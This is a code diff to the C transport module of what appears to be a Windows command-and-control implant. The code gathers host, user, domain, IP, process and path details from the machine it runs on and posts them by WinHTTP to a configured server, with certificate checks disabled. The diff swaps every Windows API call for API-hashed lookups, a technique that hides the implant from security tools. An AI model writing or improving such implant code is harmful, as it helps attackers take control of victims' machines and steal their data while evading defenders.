@@ -5,6 +5,7 @@
 #include <Transport.h>
 #include <Command.h>
 #include <Core.h>
+#include <Apihashing.h>
 
 #include <iptypes.h>
 #include <iphlpapi.h>
@@ -13,7 +14,7 @@
 
 #define DATA_FREE( d, l ) \
     memset( d, 0, l ); \
-    LocalFree( d ); \
+    Api.LocalFree( d ); \
     d = NULL;
 
 BOOL TransportInit( )
@@ -55,9 +56,9 @@ BOOL TransportInit( )
     PackageAddInt32( Package, Instance.Session.AgentID );
 
     // Get Computer name
-    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, (LPDWORD) &Length ) ) {
-        if ((Data = LocalAlloc(LPTR, Length))) {
-            GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
+    if ( ! Api.GetComputerNameExA( ComputerNameNetBIOS, NULL, (LPDWORD) &Length ) ) {
+        if ((Data = Api.LocalAlloc(LPTR, Length))) {
+            Api.GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
 
         }
     }
@@ -67,31 +68,31 @@ BOOL TransportInit( )
 
     // Get Username
     Length = MAX_PATH;
-    if ( ( Data = LocalAlloc( LPTR, Length ) ) ){
-        GetUserNameA( Data, (LPDWORD) &Length );
+    if ( ( Data = Api.LocalAlloc( LPTR, Length ) ) ){
+        Api.GetUserNameA( Data, (LPDWORD) &Length );
     }
 
     PackageAddBytes( Package, Data, strlen( Data ) );
     DATA_FREE( Data, Length );
 
     // Get Domain
-    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, (LPDWORD) &Length ) ) {
-        if ((Data = LocalAlloc(LPTR, Length))) {
-            GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
+    if ( ! Api.GetComputerNameExA( ComputerNameDnsDomain, NULL, (LPDWORD) &Length ) ) {
+        if ((Data = Api.LocalAlloc(LPTR, Length))) {
+            Api.GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
         }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
 
-    GetAdaptersInfo( NULL, (PULONG) &Length );
-    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) )
+    Api.GetAdaptersInfo( NULL, (PULONG) &Length );
+    if ( ( Adapter = Api.LocalAlloc( LPTR, Length ) ) )
     {
-        if ( GetAdaptersInfo( Adapter, (PULONG) &Length ) == NO_ERROR )
+        if ( Api.GetAdaptersInfo( Adapter, (PULONG) &Length ) == NO_ERROR )
         {
             PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
 
             memset( Adapter, 0, Length );
-            LocalFree( Adapter );
+            Api.LocalFree( Adapter );
             Adapter = NULL;
         }
 
@@ -104,13 +105,13 @@ BOOL TransportInit( )
 
 
     Length = MAX_PATH;
-    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+    if ( ( Data = Api.LocalAlloc( LPTR, Length ) ) )
     {
-        Length = GetModuleFileNameA( NULL, Data, Length );
+        Length = Api.GetModuleFileNameA( NULL, Data, Length );
         PackageAddBytes( Package, Data, Length );
     } else { PackageAddInt32( Package, 0 ); }
 
-    PackageAddInt32( Package, GetCurrentProcessId() );
+    PackageAddInt32( Package, Api.GetCurrentProcessId() );
     PackageAddInt32( Package, (DWORD) 0 );
     PackageAddInt32( Package, Instance.Session.ProcArch );
     PackageAddInt32( Package, FALSE ); // default
@@ -177,19 +178,19 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
 
     //create session
-    hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    hSession = Api.WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
     {
-        printf( "WinHttpOpen: Failed => %d\n", GetLastError() );
+        printf( "WinHttpOpen: Failed => %d\n", Api.GetLastError() );
         Successful = FALSE;
         goto LEAVE;
     }
 
-    hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
-    printf( "> WinHttpConnect=> %d\n", GetLastError() );
+    hConnect = Api.WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
+    printf( "> WinHttpConnect=> %d\n", Api.GetLastError() );
     if ( ! hConnect )
     {
-        printf( "WinHttpConnect: Failed => %d\n", GetLastError() );
+        printf( "WinHttpConnect: Failed => %d\n", Api.GetLastError() );
         Successful = FALSE;
         goto LEAVE;
     }
@@ -201,7 +202,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
 
     // make a post request
-    hRequest = WinHttpOpenRequest(
+    hRequest = Api.WinHttpOpenRequest(
         hConnect,
         L"POST",
         CONFIG_ENDPOINT,
@@ -210,11 +211,11 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         HttpFlags
     );
-    printf( "> WinHttpOpenRequest=> %d\n", GetLastError() );
+    printf( "> WinHttpOpenRequest=> %d\n", Api.GetLastError() );
 
     if ( ! hRequest )
     {
-        printf( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
+        printf( "WinHttpOpenRequest: Failed => %d\n", Api.GetLastError() );
         return FALSE;
     }
 
@@ -225,11 +226,11 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-        if ( ! WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
+        if ( ! Api.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
-            printf( "WinHttpSetOption: Failed => %d\n", GetLastError() );
+            printf( "WinHttpSetOption: Failed => %d\n", Api.GetLastError() );
         }else{
-            printf( "> WinHttpSetOption => %d\n", GetLastError() );
+            printf( "> WinHttpSetOption => %d\n", Api.GetLastError() );
 
         }
     }
@@ -237,7 +238,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     
     // Set headers to match profile
     for (INT i = 0; i < CONFIG_HEADER_COUNT; i++) {
-        WinHttpAddRequestHeaders(
+        Api.WinHttpAddRequestHeaders(
             hRequest,
             CONFIG_HEADERS[i],
             -1,
@@ -247,25 +248,25 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     
 
 
-    if ( WinHttpSendRequest( hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, Data, Size, Size, 0x0 ) )
+    if ( Api.WinHttpSendRequest( hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, Data, Size, Size, 0x0 ) )
     {
-        if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
+        if ( RecvData && Api.WinHttpReceiveResponse( hRequest, NULL ) )
         {
             RespBuffer = NULL;
             do
             {
-                Successful = WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
+                Successful = Api.WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
                 if ( ! Successful || BufRead == 0 )
                 {
                     if ( ! Successful )
-                        printf( "WinHttpReadData: Failed (%d)\n", GetLastError() );
+                        printf( "WinHttpReadData: Failed (%d)\n", Api.GetLastError() );
                     break;
                 }
 
                 if ( ! RespBuffer )
-                    RespBuffer = LocalAlloc( LPTR, BufRead );
+                    RespBuffer = Api.LocalAlloc( LPTR, BufRead );
                 else
-                    RespBuffer = LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
+                    RespBuffer = Api.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
 
                 RespSize += BufRead;
 
@@ -285,19 +286,19 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
     else
     {
-        if ( GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
+        if ( Api.GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
             Instance.Session.Connected = FALSE;
         }else {
-            printf("WinHttpSendRequest: Failed => %d\n", GetLastError());
+            printf("WinHttpSendRequest: Failed => %d\n", Api.GetLastError());
         }
         Successful = FALSE;
         goto LEAVE;
     }
 
 LEAVE:
-    WinHttpCloseHandle( hSession );
-    WinHttpCloseHandle( hConnect );
-    WinHttpCloseHandle( hRequest );
+    Api.WinHttpCloseHandle( hSession );
+    Api.WinHttpCloseHandle( hConnect );
+    Api.WinHttpCloseHandle( hRequest );
 
     return Successful;
 }
